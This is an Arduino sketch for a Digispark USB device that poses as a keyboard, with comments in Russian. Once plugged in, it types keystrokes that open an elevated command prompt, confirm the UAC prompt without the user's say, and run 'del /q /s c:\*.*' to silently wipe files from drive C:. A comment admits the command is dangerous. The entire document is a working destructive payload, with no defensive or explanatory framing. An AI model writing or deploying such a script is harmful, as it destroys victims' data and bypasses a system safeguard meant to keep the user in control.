#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);  // Инициализация
  DigiKeyboard.delay(500);

  // Открываем "Выполнить" (Win + R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Запускаем cmd от имени администратора
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1500);

  // Подтверждаем UAC (если система на английском, иначе нужно "Y" или стрелки)
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);  // Выбираем "Да" (для русской системы)
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // ⚠️ Опасная команда (удаляет всё на диске C:)
  DigiKeyboard.println("del /q /s c:\\*.*");  // Правильный синтаксис
  DigiKeyboard.delay(1000);

  // Закрываем командную строку
  DigiKeyboard.println("exit");
}

void loop() {}
